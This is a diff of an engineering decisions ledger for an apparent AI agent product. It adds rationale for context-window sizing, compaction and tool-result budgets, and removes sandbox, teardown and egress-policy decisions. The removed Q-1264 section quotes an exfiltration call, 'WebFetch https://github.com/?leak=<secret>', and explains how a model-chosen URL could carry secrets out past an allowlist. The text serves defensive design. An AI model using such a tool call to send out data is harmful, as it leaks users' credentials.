@@ -15,62 +15,11 @@
 | Q7 | Windows merge freeze for Lane W | **YES — a declared window, opened after Lane 0.1 is read** | Serializes the single Windows box |
 | Q-113 | core#113 | **CLOSE AS REFUTED**, recording deny-by-default as the decision | Record posted on #113 2026-08-29; the close is queued on FerroxLabs/wayland#1229, with wayland-core#364 filed independently for the same act -- both open, maintainer to dedupe |
 | Q-338c4 | core#338 credential surface | **Deny `/dev/tty` via `setsid`, in the SAME change as layer 1** | Layer 1 alone makes the test green while `credential.helper` stays open |
-| Q-379 / core#379 | the TEARDOWN of the session Q-338c4 creates | **Kill the process GROUP whenever a quarantine `git` run is ABANDONED — owned by the run's SCOPE, never by its branches** | `Child::kill` is not a teardown once the child is a session leader; branch-by-branch is how the gap was made; see D-379 below |
+| Q-1172c3 / wayland#1172 c3 | what happens when the LEARNED served window is one core cannot compact in (the 4,096 slot) | **NARROW ONTO IT UNCONDITIONALLY AND REFUSE THE RUN OUT LOUD** | No `supports_compaction` escape hatch in `narrow_to_served_window`; the refusal carries `minimum_workable_window` and the `num_ctx` remedy; the truncation notice needs the matching third arm |
+| Q-1218 / wayland#1218 | clamp `size_output_cap` to the withheld RESERVE, or to the room left in the window in force | **TO THE ROOM IN THE WINDOW IN FORCE** | Never clamp the ask to the reserve at every input - that cuts a 200k Claude turn to the compaction reserve |
+| Q-1200 / wayland#1200 | bound the tool-result BUDGET only, or the protected tail too | **BOTH, and record the term that cannot be bounded** | The per-result ingestion cap is not window-derived; the named gap belongs beside the arithmetic, not in a lane report |
+| Q-1255 / wayland#1200 residue | fix the unbounded stub term here, or ticket it | **TICKET IT — FerroxLabs/wayland#1255 — and pin the arithmetic in-tree** | The only fix collapses already-stubbed bodies, which is the one thing the pass promises never to do; that trade is a decision, not a patch |
 | Q-391 / core#244 c4 | is the Windows local-operator shell expected to confine the VCS content store? | **NO — and say so everywhere the product speaks** | Rewrite #244 c4 to its true scope; keep the standing pin test; do not reopen AppContainer |
-| Q-368-honesty / core#368 | fix AppContainer's categorical deny, or declare it? | **DECLARE IT. Do not build the ACL fix.** | `#368` c1-c3 are AppContainer ACL work on the containment boundary. The standing decision is that Windows ships with NO filesystem sandbox, the Job-object default is intended, and AppContainer is never to be chased again — months were lost to it. What was open was only the honesty of the claim. Obliges: `AppContainerBackend::known_limitations` names the defect and `#368`, graded by a test; `#368` c1-c5 stay OPEN and NOT-MET, owned by whoever reverses the standing decision, and no lane may grade them met by weakening the deny arm |
-| Q-369-lease / core#369 | quarantine the unrecoverable lease, or declare the wedge? | **DECLARE IT, and make the cause READABLE.** | Same disposition as Q-368-honesty for the same reason: `#369` c1 is lease-recovery surgery inside the AppContainer backend. `#369` c2 is NOT — a bare `bool` that hid a recorded cause for twelve days is a product-honesty defect on a surface every operator reads, so c2 is CLOSED here (`sandbox status` prints the recorded probe cause, human and `--json`). Obliges: c1, c3 and c4 stay OPEN on `#369`; the wedge is declared in `known_limitations` so no future operator loses a fortnight rediscovering it |
-| Q-369c4 / core#369 c4 | what to do about the package ACEs already leaked onto a home directory | **TELL THE OPERATOR WHERE TO LOOK; do not auto-revoke.** | An automatic sweep of `S-1-15-2-*` ACEs across a user's home directory is a destructive, unattended, privileged operation whose blast radius is the whole profile, written to repair a defect measured exactly once. The leaked ACE grants a package SID that no longer has a profile, so it is inert until an AppContainer with the same SID is recreated. Obliges: the wedged-lease limitation names the lease directory so an operator can find the recorded intents; `#369` c3 (find what recorded a whole-home grant) stays open and is the thing actually worth fixing — a revocation tool for a leak still being produced is treating the symptom |
-| Q-389c2 / core#389 | Windows quarantine console: reach c1's property, or take c2's branch? | **TAKE c2 — LABEL the prompt. c1 is unreachable.** | `#389` measured both remedies foreclosed: reparenting is defeated by `AttachConsole(<pid>)` and a private console by `FreeConsole()` first. Windows has no session-leader equivalent, and the AppContainer route is closed by the decision above. PRODUCT COST, stated: this does NOT stop a determined child re-attaching to the operator's console — it only lets the operator ATTRIBUTE what appears. It also costs one unconditional stderr line per quarantine `git` spawn on Windows, which is noise on a non-interactive host, accepted because a notice that fires only when it guesses a human is watching is a notice that is absent exactly when it is wrong about that. Obliges: `#389` c1 stays OPEN and NOT-MET, and the residual pin measuring the bypass is KEPT, not deleted |
-| Q-1264 / wayland#1264 | is an allowlisted apex admitted on the host match alone for MODEL-chosen URLs too? | **NO — split the grant by request ORIGIN, not by client** | Stamp origin centrally on the request; keep product traffic's unconditional allow; only `WebFetch` is model-directed today |
-
-## D-379 — the teardown Q-338c4 owed and did not record
-
-MASTER-PLAN.md:202 obliged "Layers 1+2 as ONE change, teardown decided in the same change".
-Layers 1+2 landed; the teardown did not, and Q-338c4 above did not mention it. This is that
-decision, written where it should have been written, one row up.
-
-**What was wrong.** `harden_against_credential_prompt` puts every quarantine `git` child in a
-NEW SESSION. The abort paths in `run_git` did `child.kill(); child.wait()` — one pid. Every
-helper `git` spawned (credential, askpass, transport) inherited the new group, so no group
-signal reached them, and with no controlling terminal no hangup would either. The hardening
-therefore made those helpers strictly LESS reachable than before it: previously they shared our
-group and our terminal.
-
-**Taken: kill the group.** `terminate_hardened_tree` sends `SIGKILL` to `-pgid`, where the pgid
-is the child's pid because `setsid` made it both session and group leader. Safe after the direct
-child has been reaped, because a pid is not recycled while it is still in use as a process-group
-id, so the signal reaches our surviving members or nothing at all.
-
-**On every ABANDONED run — which is NOT the same set as every failing one.** The first form of
-this decision said "on every FAILING exit" and that was wrong in both directions, so it is
-restated here rather than left to be discovered.
-
-WRONG IN ONE DIRECTION: `run_hardened` ends with `Err` on a nonzero `git` status, and that exit
-deliberately does NOT tear down. `git` ran to completion and said no; both pipes reached EOF, so
-nothing it spawned is holding our stdio; and `git`'s own `git-credential-cache--daemon` is in that
-group and is shared with the user's other `git` operations. Killing it because a clone failed
-would be the same regression as killing it because a clone succeeded.
-
-WRONG IN THE OTHER: the plan counted TWO abandoning exits and there were three. The wall-clock
-timeout is the one #379 measured; the drain-grace exit — `git` already exited AND reaped, a
-helper's background worker still holding the inherited pipe — is the second; and `try_wait`
-returning `Err` was the third, propagated with `?`, abandoning a child that is still RUNNING and
-unreaped. That third exit sat in the same function throughout and a teardown written as a line
-copied into the two known branches would not have covered it.
-
-**So the teardown is owned by the SCOPE.** `HardenedTree` is armed once, immediately after the
-spawn, and its `Drop` tears the session down; every `Err` path — including one nobody has written
-yet — inherits that without being told. There is exactly ONE `disarm` site, reached only after
-both pipes have hit EOF, and it is the single place this codebase claims a tree is finished rather
-than abandoned. Enumerating branches is how #338 opened this hole; the decision is deliberately
-not to enumerate them again.
-
-**Not claimed.** A descendant that calls `setsid`/`setpgid` for itself leaves the group and no
-group signal can reach it; that is a sandbox's job, not a teardown's. On Windows the hardening
-creates no session and no group — `DETACHED_PROCESS` is a creation-time console decision — so
-there is nothing for a group signal to address there. Windows did not regress (it had no group
-teardown to lose) but it has no teardown either; that gap is stated in the code and on the ledger
-rather than covered by the wording of this row.
 
 ## D-SECRET-2 — REFUTED 2026-08-29. Do not build this.
 MASTER-PLAN.md §8 recommended splitting `reached` per tracker "to close the one hole in the
@@ -160,55 +109,110 @@ so the day it closes, someone re-grades instead of quietly agreeing. Scope of th
 and macOS (sandbox-exec) both enforce read-deny at their shipping default, so the exemption is inert
 there, and every non-local principal on Windows is still refused.
 
-## Why Q-1264 splits the grant by ORIGIN and not by client
+## Why Q-1172c3 refuses rather than narrows-and-bricks (the 4,096 decision)
+This was the explicit blocker on wayland#1172 c3, and it was parked twice: the ticket's own close
+note says "wiring the learned window into the guard today makes a small-window run fail outright,
+because the fixed buffers saturate to zero at 4,096". Three options, and the third is taken.
 
-`classify()` returned `Allow` the moment the host matched the allowlist — above the body-method
-check and above the path/query check. That early return was the ONLY call-site guard for
-`get_carries_data`, so for a host on the shipped 38-entry default set the shape checks were
-unreachable. `WebFetch` is GET-only but takes its whole URL out of tool input, and `github.com`,
-`notion.so` and `linear.app` all ship on that set, so
-`WebFetch https://github.com/?leak=<secret>` was admitted with no approval in any mode.
+**A. Keep the `supports_compaction` gate (the status quo until this release).** A corroborated
+4,096-token served window was deliberately NOT narrowed onto, so core went on sizing against
+`UNVERIFIED_CONTEXT_WINDOW` = 32,768 - 8x the window the endpoint had been OBSERVED to serve - and
+kept sending ~10.5k-token prompts that Ollama silently truncated. This is the state wayland#1172
+refused to let #1150 close, and it fails on the FAIL-OPEN side: the model answers fluently from a
+context that no longer holds the system prompt or the task. Declining to narrow did not avoid a
+brick, it hid one.
 
-**Measured, not modelled.** With the fix reverted in place, the end-to-end arm
-(`issue_1264_model_directed_egress_test`) fetched `https://github.com/?leak=<24-char token>` over
-the real network and came back `Ok { status: 200 }`. The issue itself was filed with the caveat
-"graded from source reading, not a live run"; that gap is now closed in the direction that matters.
+**B. Narrow unconditionally and let the boundaries fall where they fall.** At 4,096 with
+`MAX_RESERVE_FRACTION = 0.55` the scaled input ceiling is 2,527 and the autocompact threshold 1,844,
+both under `BASELINE_TURN_TOKENS` = 3,118. Every run would terminate at the pre-flight guard before
+the user's first turn, with a generic overflow error. Neither degradation rung can recover it -
+rung 1 sheds tool RESULTS and rung 2 truncates or drops MESSAGES, while `est(&[]) == overhead` -
+because the floor is the system prompt plus the tool schemas, which compaction does not touch.
+Louder than A, and correct about the window, but it reads to the operator as a product bug.
 
-**Taken: the split, in the form the issue's c2/c3 describe — but keyed on the REQUEST, not the
-client.** Two shapes were considered and one was refused:
+**C. TAKEN: narrow unconditionally, AND refuse the endpoint out loud, once, with the number that
+fixes it.** The escape hatch is gone from `narrow_to_served_window`, so nothing sizes against a
+window the endpoint has been observed not to serve. `unworkable_window_refusal` terminates the run
+at the TURN-LOOP TOP, before `run_compaction`, naming `minimum_workable_window` (6,929 at the
+default reserves, computed rather than hardcoded) and the `num_ctx` / `OLLAMA_CONTEXT_LENGTH` /
+`[compact] context_window` remedy.
 
-- REFUSED — split the POLICY per client (a provider policy and a tool policy). Two independent
-  external reviews refuted it and the reason holds: the boundary would then depend on who
-  constructed the client, so any code path that got hold of a provider-built client would inherit
-  the provider grant. That is a bypass factory rather than a boundary.
-- TAKEN — one policy, one allowlist, one classifier, plus one more FACT about the request.
-  `EgressOrigin` is stamped by the issuing `EgressClient` and copied into every request by
-  `EgressRequestBuilder`. No call site sets it, so a tool cannot claim to be provider traffic by
-  choosing how it sends.
+The reason C is not B with better copy: B's failure arrives from the pre-flight guard AFTER a prompt
+has been assembled, and its message is about token counts. C's arrives before the provider is called
+at all - zero requests are sent, so no prompt the endpoint would truncate ever leaves - and its
+message is about the endpoint's configuration, which is the only thing the operator can act on.
 
-**Product traffic keeps its unconditional allow, deliberately.** The allowlist is how an operator
-authorises their own provider, channel, MCP and API-tool destinations. Shape-checking those would
-refuse the agent's own LLM POSTs — the issue names this and it is why "just narrow the allowlist"
-was never available. `provider_traffic_to_the_same_apex_keeps_its_unconditional_allow` is the
-wrong-refusal control and fails if that grant is ever lost.
+**What this obliges, and why the two could not be sequenced apart.** The gate's removal and the
+refusal had to land together: A alone is the reported defect, B alone is a worse-looking version of
+it. It also obliges the truncation notice to grow a third arm, because "Core is now sizing this
+session against the {served}-token window" becomes false in the one case C is about - that is
+wayland-core#382 c1, and the arm reads "Core cannot size a session against N tokens at all".
 
-**Exactly one backend is model-directed today, and that is a judgement, not a discovery.**
-`HttpFetchBackend` does `self.client.get(&req.url)` with the URL verbatim from tool input — host,
-path and query all model-chosen. The scoped API backends (`http_github`, `http_gitlab`,
-`http_notion`, `http_linear`) build their URL with `format!` against a fixed host with
-percent-encoded path segments, so an operator's allowlist entry for that host authorises exactly
-the traffic that follows; `a_scoped_api_backend_is_not_model_directed` pins that reading so the
-distinction is graded rather than assumed. A new backend that fetches a model-supplied URL must
-pass `EgressOrigin::ModelDirected` to `build_ssrf_safe_tool_client_with_origin`. **That opt-in is
-not self-enforcing** — this is the residual risk of the shape and it is recorded rather than
-papered over: the default is `Product`, so a future model-URL surface that forgets the stamp is
-admitted. Making it fail closed instead would mean shape-checking all 132 client construction
-sites, which refuses the product's own traffic. `the_shipped_web_fetch_backend_carries_the_model_directed_stamp`
-pins the one call site that exists, and both mutations — reverting the classifier branch, and
-reverting the stamp — were run and produce RED, on different arms.
+## Why Q-1218 clamps to the window, not to the reserve
+wayland#1218's title is "the scaled `output_reserve` is decoupled from the `max_tokens` core actually
+sends", which reads as an instruction to clamp the ask to the reserve. Doing that literally is a
+regression: on a 200,000-token window the scaled reserve is 20,000 tokens, so a Claude turn with a
+real 64,000-token output ceiling would be cut to under a third of it on every turn, on every large
+model, to fix a defect that only exists below a 49,152-token window.
 
-**`Ask` grew an unattended fallback, because "nobody is here to ask" cannot mean one thing for
-both cases.** `resolve_ask` returned `Allow` with no doorbell wired, which is right for a
-data-less read to a new destination: nothing sensitive leaves. It is exactly wrong for a
-model-chosen URL carrying data, where an unattended run is the attack's precondition. Only that
-class refuses; the pre-existing behaviour is otherwise unchanged.
+What the ticket actually measures is an OVERFLOW - "total ask 13,245 on an 8,192 slot" is
+ceiling 5,053 + ask 8,192 - so the property is `admitted input + asked output <= window`, and
+`room(window_in_force) = window - est - WINDOW_BUFFER` delivers exactly that at every input, not
+only the worst one. It is also IDENTITY wherever the window in force is the catalogued window, which
+is every registry model absent a #1172 narrowing, so no large-window sizing moves. Pinned by
+`a_window_in_force_that_is_the_catalogued_one_changes_no_sizing`, which would fail under the
+literal reading.
+
+## Why Q-1200 bounds both terms and names the one it cannot
+wayland#1200's worst case is `total_budget_bytes + keep_recent x max_result_size` = 120,000 +
+4 x 50,000 = 320,000 bytes, about 80,000 tokens on a 32,768-token window. Bounding only the budget
+leaves the protected tail dominating - 200,000 bytes of it - so the ticket would be half-closed with
+a number that still does not fit. Capping the tail by COUNT instead of by BYTES was rejected: it
+drops the tail to one result on any window under ~100,000 even when the results are small, and a
+stubbed working set is how the re-read loop wayland#1172 reports begins.
+
+The term that cannot be bounded here is named rather than hidden: the NEWEST tool result is
+protected unconditionally, and its size is the per-result ingestion cap
+(`wcore_tools::Tool::max_result_size` = 50,000 chars), which is not window-derived. So the budget is
+sized against `admissible - max(admissible/2, MAX_TOOL_RESULT_BYTES)` - room is left for that one
+result rather than pretending it is not there. Below a ceiling of about 12,500 tokens that single
+result exceeds the window on its own and no arithmetic in `wcore-config` can change it; that window
+is unworkable by Q-1172c3's test and is refused by the turn loop, which is where it belongs.
+
+## Why Q-1255 (the THIRD term) is ticketed rather than fixed in this lane
+
+Q-1200 above bounds two terms and names one it cannot bound. Answering this lane's refutation
+turned up a **third** term that neither the ticket's arithmetic nor that decision mentions, because
+until the pass was driven and measured rather than predicted, nobody had looked at what it leaves
+behind:
+
+```
+carried = protected_tail + dropped_results x stub_len          stub_len = 130 bytes
+```
+
+`bound_accumulated_tool_results` replaces each over-budget result with a stub and never re-mutates
+one. Measured on a 32,768-token window at HEAD: 52,470 bytes at 20 tool calls, 62,870 at 100,
+114,870 at 500, **309,870 = 77,467 tokens at 2,000** — 2.36x the whole window. The window's own
+ceiling (80,832 bytes) is crossed at about **238 tool calls**. That is wayland#1150's reported
+symptom, reached by a longer session rather than by a bigger budget, and 2,000 tool calls is an
+ordinary agent session.
+
+**It is not fixed here, and the reason is a real trade rather than a schedule.** The residue exists
+*because* the pass is monotone: an already-stubbed body must never change bytes again, or the
+provider's cached prefix is invalidated on every turn — which is the entire discipline
+wayland#1150 c6 and wayland#559 were built on. The only fix that changes the O(n) is to collapse
+runs of adjacent stubs, and that means re-mutating a stubbed body. A plausible shape is to collapse
+at epoch boundaries only, reusing the `epoch_results` quantization the pass already has, so the
+prefix is rewritten once per epoch instead of once per turn — but the cost of that rewrite has not
+been measured, and improvising it inside a lane answering a refutation is how the first #1200 fix
+came to be graded against a predictor instead of against the pass.
+
+Shortening `bounded_result_stub` is explicitly **not** a fix: it moves the constant, not the
+order of growth.
+
+So: filed as FerroxLabs/wayland#1255 with the measurements and the trade written out, and the
+arithmetic pinned in-tree by `the_carried_payload_grows_by_one_stub_per_dropped_result` so the term
+cannot be rediscovered as a surprise. The corresponding false gloss — that carried bytes "stop
+growing with the session" — has been removed from wayland#1150 c4's ledger note, and the
+`+ 20_000` slack that hid the term (the real difference between a 20-call and a 100-call session is
+10,400 bytes) has been replaced by an equality on it.
